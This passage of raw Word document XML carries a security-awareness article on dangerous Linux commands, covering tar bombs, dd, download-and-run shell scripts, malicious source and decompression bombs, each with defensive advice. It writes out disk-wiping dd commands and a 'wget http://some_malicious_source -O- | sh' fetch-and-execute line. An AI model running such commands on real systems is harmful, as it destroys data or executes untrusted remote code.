      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.tar</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> format. A Tape Archive (Tar) bomb can be created with this command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D23882"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It is </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>an archive file which explodes into thousands or millions of files with names similar to the existing files into the current directory</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than into a new directory when untarred. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CECB8F"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You can avoid becoming a victim of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> bomb by </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>regularly creating a new protective directory whenever you receive a tar file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and then moving the received tar file into this directory before </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>untarring</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F642237"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If the tar file is indeed a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> bomb then you can simply remove the newly created directory to get rid of it. Another way to avoid the explosion of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>tar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> bomb is via </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-t</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option to list all of the content of a tar file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to give you an idea of the type of content contained within the tar file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8155BA"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lastRenderedPageBreak/>
        <w:t>6. dd command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC26775"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The </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>dd</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> command is used to </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>copy &amp; convert hard disk partitions</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>. However, it can turn out to be harmful if you specify the wrong destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1007D7C3"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The command may be any one of these:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ED08D1" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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dd if=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>hda</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> of=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>hdb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7B77FD82" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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dd if=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>hda</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> of=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>sdb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="45455E49" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="150"/>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dd if=something of=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>hda</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="113EEC51" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>dd if=something of=/dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>sda</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="35FC9214"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The following command will zero out the whole primary hard drive: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>dd if=/dev/zero of=/dev/had</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357CDB03"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 xml:space="preserve">7. Shell Script Code </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EAE273"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Someone may victimize you by </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>giving you the link to a shell script and endorsing you to download and execute it</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">. The script may contain some malicious or dangerous code inside. The </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>format of command</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> may look like this: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://some_malicious_source -O- | sh</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> will download the script while the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> downloads the script execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFE1FE1"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8. Malicious Source Code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0219ED3C"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Someone gives you the source code and asks you to compile it. The code </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>may appear to be a normal code but in fact some malicious code is disguised in the large source code</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and it may cause harm to your system. To avoid being victimized by this kind of attack, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>only accept and compile your source code from trustworthy sources</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AEB8E4" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:before="525" w:after="225" w:line="639" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">9. Decompression Bomb </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F7CF1C"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t xml:space="preserve">You have received a compressed file and you are asked to extract this file which appears to be very small in size but may be a few KB. In fact, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>this small sized compressed file contains very highly compressed data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D12C34" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:before="150" w:after="300"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
